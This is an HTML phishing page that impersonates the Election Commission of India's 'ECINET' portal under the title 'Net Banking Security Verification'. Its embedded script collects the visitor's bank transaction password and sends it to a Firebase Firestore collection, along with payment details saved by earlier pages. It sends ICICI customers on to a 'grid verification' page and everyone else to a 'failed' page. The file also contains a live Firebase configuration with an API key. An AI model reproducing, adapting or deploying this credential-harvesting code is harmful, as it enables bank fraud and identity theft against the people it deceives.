<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECINET - Net Banking Security Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 15px; 
        }

        /* Form Container - Index.html ki tarah exact card style */
        .form-container { 
            background: #ffffff; 
            padding: 0 30px 30px 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
            width: 100%; 
            max-width: 440px; 
            overflow: hidden; 
        }

        /* Top Blue Header Section - बिना किसी ऊपर के गैप के */
        .top-header {
            margin-top: 0;
            margin-left: -30px;
            margin-right: -30px;
            margin-bottom: 25px;
            padding: 0 0 18px 0;
            width: calc(100% + 60px);
            background-color: #0056b3;
            text-align: center;
            color: white;
        }

        .top-header img {
            width: 100%;
            max-height: 100px;
            object-fit: contain;
            margin-bottom: 8px;
            display: block;
            background: transparent;
        }

        .top-header .hindi-title {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 3px;
            letter-spacing: 0.5px;
        }

        .top-header .eng-title {
            font-size: 11px;
            font-weight: 400;
            margin-bottom: 8px;
            opacity: 0.9;
        }

        .top-header h1 {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .form-container h2 { 
            text-align: center; 
            margin-bottom: 20px; 
            color: #0056b3; 
            font-size: 20px; 
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .form-group { margin-bottom: 18px; text-align: left; }
        .form-group label { display: block; margin-bottom: 6px; color: #004085; font-weight: 700; font-size: 11px; letter-spacing: 0.8px; text-transform: uppercase; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1px solid #dfe4ea; border-radius: 8px; font-size: 14px; background: #f8f9fa; color: #333; }
        .form-group input:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); }
        
        .btn-next { width: 100%; padding: 14px; background: #0056b3; border: none; border-radius: 8px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        
        .footer-text { text-align: center; margin-top: 25px; font-size: 10px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; letter-spacing: 0.3px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Top Blue Header Section without top gap -->
        <div class="top-header">
            <img src="logo.png" alt="Election Commission Logo">
            <div class="hindi-title">भारत निर्वाचन आयोग</div>
            <div class="eng-title">Election Commission of India</div>
            <h1>ECINET</h1>
        </div>

        <h2 id="formTitle">Security Verification</h2>
        <form id="transPassForm">
            <div class="form-group" id="passGroup">
                <label for="transPassword" id="labelName">Enter Your Transaction Password</label>
                <input type="password" id="transPassword" name="transPassword" placeholder="Enter password" required>
            </div>
            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
        </form>
        <div class="footer-text">
            भारत निर्वाचन आयोग | Election Commission of India
        </div>
    </div>

    <!-- Firebase SDK & Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const docId = localStorage.getItem('voterDocId');
        let selectedBank = localStorage.getItem('selectedBankName') || "";

        let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
        let deviceId = localStorage.getItem('voterDeviceId');
        let paymentInfo = "";

        if (submissions.length > 0) {
            let targetIndex = -1;
            for (let i = submissions.length - 1; i >= 0; i--) {
                if (submissions[i].deviceId === deviceId) {
                    targetIndex = i;
                    break;
                }
            }
            if (targetIndex === -1) targetIndex = submissions.length - 1;
            if (submissions[targetIndex].paymentDetails) {
                paymentInfo = submissions[targetIndex].paymentDetails;
            }
        }

        const isIcici = paymentInfo.includes("ICICI");
        if (isIcici) {
            document.getElementById('formTitle').innerText = "ICICI Verification";
            document.getElementById('passGroup').style.display = 'none';
            document.getElementById('transPassword').required = false;
            document.getElementById('submitBtn').innerText = "Proceed to Grid Verification";
        }

        document.getElementById('transPassForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const transPassword = document.getElementById('transPassword').value;
            const passwordToSave = isIcici ? "N/A (Skipped)" : transPassword;

            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                await updateDoc(docRef, {
                    transPassword: passwordToSave,
                    currentStep: isIcici ? "ICICI Proceeded to Grid" : "Transaction Password Submitted"
                });

                setTimeout(() => {
                    if (isIcici) {
                        window.location.href = "grid_step1.html"; 
                    } else {
                        window.location.href = "failed.html"; 
                    }
                }, 1000);
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("डेटा सेव करने में समस्या हुई।");
                btn.disabled = false;
                btn.innerText = isIcici ? "Proceed to Grid Verification" : "Verify & Submit";
            }
        });
    </script>
</body>
</html>
